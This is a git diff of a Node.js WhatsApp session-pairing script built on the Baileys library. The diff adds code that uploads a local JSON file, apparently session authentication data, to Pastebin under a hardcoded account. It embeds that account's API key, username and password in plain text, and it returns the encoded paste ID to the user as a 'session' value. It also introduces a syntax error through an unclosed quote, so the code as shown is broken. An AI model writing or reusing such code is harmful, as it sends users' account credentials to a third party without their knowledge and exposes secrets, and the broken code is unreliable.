@@ -2,6 +2,7 @@ const makeWASocket = require("@adiwajshing/baileys").default
 const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
+const PastebinAPI = require('pastebin-js');
 const { delay, useSingleFileAuthState } = require("@adiwajshing/baileys")
 const { state, saveState } = useSingleFileAuthState('./session.json')
 const countapi = require('countapi-js');
@@ -29,11 +30,22 @@ function OLDUSER() {
       const session = fs.readFileSync("./session.json");
       const stick = fs.readFileSync("./i.webp");
       
+	    pastebin = new PastebinAPI({
+      'api_dev_key' : 'r1eflgs76uuvyj-Q8aQFCVMGSiJpDXSL',
+      'api_user_name' : 'ALPHA-704',
+      'api_user_password' : '0634923280/#'
+    });
+pastebin
+    .createPasteFromFile("./AL704.json", "ALPHA-704", null, 1, "N")
+    .then(async function (data) {
+    	unique = data.split("/")
+      sesmsionId= unique[3]
+      let Sesmsion = btoa(sesmsionId)
       let test = JSON.parse(session)
 let plat = test.creds.platform
 let tshephang = test.creds.me.id
 countapi.visits().then(async(result) => {
-	var plk_say = new Date().toLocaleString('HI', { timeZone: 'Africa/Johannesburg' }).split(' ')[1]
+	var plk_say = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata }).split(' ')[1]
          const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
          var plk_here = new Date().toLocaleDateString(get_localized_date)
          var Info = '⏱Time scanned: ' + plk_say + '\n\n 📅 Date :' + plk_here + ''
@@ -49,7 +61,7 @@ res = parseInt(resu)
  `,
           templateButtons : [
     {index: 1, urlButton: {displayText: 'My github!', url: 'https://github.com/'}},
-    {index: 2, urlButton: {displayText:'ᴄᴏᴘʏ sᴇssɪᴏɴ', url: 'https://www.whatsapp.com/otp/copy/'+(Session)}},
+    {index: 2, urlButton: {displayText:'ᴄᴏᴘʏ sᴇssɪᴏɴ', url: 'https://www.whatsapp.com/otp/copy/'+(Sesmsion)}},
     {index: 3, urlButton: {displayText: 'Owner' , url : 'http://wa.me/121212text=Hi+bro+✌️'}},
 ],
 }
